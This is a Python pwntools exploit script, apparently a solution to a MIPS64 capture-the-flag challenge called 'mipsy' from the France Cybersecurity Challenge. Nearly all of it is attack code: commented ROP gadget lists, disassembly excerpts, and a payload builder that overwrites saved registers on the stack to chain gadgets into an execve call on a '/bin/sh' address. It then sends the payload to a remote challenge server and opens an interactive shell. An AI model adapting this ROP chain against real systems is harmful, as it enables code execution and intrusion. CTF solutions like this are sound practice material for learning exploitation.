#!/usr/bin/python3
from pwn import ELF, context, remote, p64 

BINSH = 0x120025A20

e = ELF('mipsy')

context.bits = 64
context.arch = "mips"
context.endian = "big"

def make_pld(s, val, pos):
    if len(s) == pos:
        s += val
        return s
    elif len(s) > pos:
        s = s[:pos-1] + val + s[pos-1+len(val):]
        return s 
    elif len(s) < pos:
        k = "\x00"*(pos-len(s))
        return s + b"\x00"*(pos-len(s)) + val 


# 0x000000012000ed58 : ld $ra, 0x28($sp) ; ld $gp, 0x20($sp) ; ld $s0, 0x18($sp) ; jr $ra ; daddiu $sp, $sp, 0x30
# 0x000000012000446c : ld $fp, 0x50($sp) ; ld $gp, 0x48($sp) ; daddiu $sp, $sp, 0x60 ; jr $ra
# 0x000000012002238c : addiu $v0, $zero, 0xe ; ld $s4, 0x60($sp) ; ld $t9, -0x7838($gp) ; ld $a1, 0x68($sp) ; move $a2, $s4 ; daddiu $a0, $sp, 1 ; ld $v0, 0x78($sp) ; jalr $t9 ; sb $v0, ($sp)
# 0x00000001200155fc : addiu $a1, $zero, 0x10 ; move $a0, $v0 ; move $t9, $s1 ; bal 0x120011f78 ; sd $v0, 0xd0($sp) ; bnez $v0, 0x1200158ec ; ld $t9, 0xd8($sp) ; move $a1, $s5 ; jalr $t9 ; move $a0, $s4

# 0x000000012000b818 : addiu $a2, $zero, 0x6c ; sd $ra, 8($sp) ; jalr $t9 ; move $a1, $zero ; ld $ra, 8($sp) ; ld $gp, ($sp) ; jr $ra ; daddiu $sp, $sp, 0x1

# 0x0000000120014a28 : addiu $a1, $zero, 1 ; bnez $v0, 0x12001480c ; ld $t9, 0x128($sp) ; ld $a0, 0x108($sp) ; jalr $t9 ; addiu $a1, $zero, 1
# 0x0000000120014b28 : move $a0, $s3 ; bnez $v0, 0x120014810 ; ld $t9, 0x130($sp) ; ld $a0, 0x100($sp) ; move $a2, $s6 ; jalr $t9 ; move $a1, $a0
# 0x0000000120015620 : move $a0, $s4 ; bnez $v0, 0x12001587c ; ld $a1, 0xd0($sp) ; ld $t9, 0xd8($sp) ; jalr $t9 ; move $a0, $s6
# 0x0000000120014c14 : move $a0, $s5 ; bnez $v0, 0x120014810 ; ld $a2, 0x100($sp) ; ld $t9, 0x130($sp) ; move $a1, $s6 ; jalr $t9 ; move $a0, $s6

# 0x0000000120015a3c : move $s7, $v0 ; beqz $fp, 0x120015884 ; ld $a0, -0x7f98($gp) ; ld $t9, -0x7808($gp) ; ld $a1, 0xe0($sp) ; daddiu $a0, $a0, 0x7628 ; jalr $t9 ; addiu $s7, $zero, 1

# x0000000120014a18 : nop ; ld $a0, 0x100($sp) ; ld $t9, 0x128($sp) ; jalr $t9 ; addiu $a1, $zero, 1
# 0x000000012000fb68 : sd $v0, -8($s5) ; ld $s7, 0x50($sp) ; ld $s6, 0x48($sp) ; ld $s5, 0x40($sp) ; ld $s4, 0x38($sp) ; ld $s3, 0x30($sp) ; ld $s2, 0x28($sp) ; ld $s1, 0x20($sp) ; ld $s0, 0x18($sp) ; jr $ra ; daddiu $sp, $sp, 0x60
# 0x000000012000fea0 : sd $v0, 0x10($sp) ; ld $ra, 0x28($sp) ; ld $gp, 0x20($sp) ; jr $ra ; daddiu $sp, $sp, 0x30

# 0x120015628 : ld $a1, 0xd0($sp) ; ld $t9, 0xd8($sp) ; jalr $t9 ; move $a0, $s6
# 0x12000FEA4 : ld $ra, 0x28($sp) ; ld $gp, 0x20($sp) ; jr $ra ; daddiu $sp, $sp, 0x30
# 0x12000FB70 : ld $s6, 0x48($sp) ; ld $s5, 0x40($sp) ; ld $s4, 0x38($sp) ; ld $s3, 0x30($sp) ; ld $s2, 0x28($sp) ; ld $s1, 0x20($sp) ; ld $s0, 0x18($sp) ; jr $ra ; daddiu $sp, $sp, 0x60

# 0x12002406C : 
"""
.text:000000012002406C                 ld      $ra, 0x50-8($sp)  # Load Doubleword
.text:0000000120024070
.text:0000000120024070 loc_120024070:                           # CODE XREF: chachapoly_crypt_and_tag+60↑j
.text:0000000120024070                                          # chachapoly_crypt_and_tag+DC↓j
.text:0000000120024070                 ld      $gp, 0x50-10($sp)  # Load Doubleword
.text:0000000120024074                 ld      $s6, 0x50-18($sp)  # Load Doubleword
.text:0000000120024078                 ld      $s5, 0x50-20($sp)  # Load Doubleword
.text:000000012002407C                 ld      $s4, 0x50-28($sp)  # Load Doubleword
.text:0000000120024080                 ld      $s3, 0x50-30($sp)  # Load Doubleword
.text:0000000120024084                 ld      $s2, 0x50-38($sp)  # Load Doubleword
.text:0000000120024088                 ld      $s1, 0x50-40($sp)  # Load Doubleword
.text:000000012002408C                 ld      $s0, 0x50-48($sp)  # Load Doubleword
.text:0000000120024090                 jr      $ra              # Jump Register
.text:0000000120024094                 daddiu  $sp, 0x50        # Doubleword Add Immediate Unsigned
"""

SET_V0 = 0x12001B4D8 # : ld $v0, 0x210($sp) ; ld $t9, 0x228($sp) ; jalr $t9 ; move $a0, $s6

#SET_S0 = 0x000000012002406C

#SET_A0 = 0x120014B30 # : ld $t9, 0x130($sp) ; ld $a0, 0x100($sp) ; move $a2, $s6 ; jalr $t9 ; move $a1, $a0
#SET_A1 = 0x120015628 # : ld $a1, 0xd0($sp) ; ld $t9, 0xd8($sp) ; jalr $t9 ; move $a0, $s6
#SET_A2 = 0x12001B418 
"""
.text:000000012001B418                 ld      $a2, 0x350+var_120($sp)  # Load Doubleword
.text:000000012001B41C                 ld      $t9, 0x350+var_D0($sp)  # Load Doubleword
.text:000000012001B420                 move    $a1, $zero
.text:000000012001B424                 jalr    $t9              # Jump And Link Register
.text:000000012001B428                 move    $a0, $s6
"""

#  0x00000001200128f4 : ld $v1, 0x70($sp) ; sd $a1, ($a0) ; ld $a1, ($v0) ; daddu $v0, $v1, $s2 ; sd $a1, 8($a0) ; ld $a2, ($v0) ; ld $t9, 0xd0($sp) ; move $a1, $s1 ; jalr $t9 ; move $a0, $s1
SET_V1 = 0x000000012001270c # : ld $v1, 0x80($sp) ; sd $v0, 0xf0($sp) ; dsubu $s5, $v0, $v1 ; dsll $v0, $s5, 6 ; ld $a0, 0xb8($sp) ; ld $t9, 0xe0($sp) ; move $a1, $v0 ; sd $v1, 0xf8($sp) ; jalr $t9 ; sd $v0, 0x100($sp)

EXECVE = 0x120004134

GP = 0x120048020
BASE_RSP = 0x90

def start():
    return remote("challenges2.france-cybersecurity-challenge.fr", 4005)
    # return remote("localhost", 4000)

io = start()
io.sendlineafter("] ", b"3")

pld  = make_pld(b"", p64(GP), BASE_RSP-0x18) # $gp
pld  = make_pld(pld, p64(SET_V1), BASE_RSP-0x8) # $ra
pld  = make_pld(pld, p64(0x0), BASE_RSP+(0x80)) # $v1
pld  = make_pld(pld, p64(SET_V0), BASE_RSP+(0xe0)) # $t9
pld  = make_pld(pld, p64(BINSH), BASE_RSP+(0x210)) # $v0
pld  = make_pld(pld, p64(EXECVE), BASE_RSP+(0x228)) # $t9

io.sendlineafter(">>> ", pld)
io.interactive()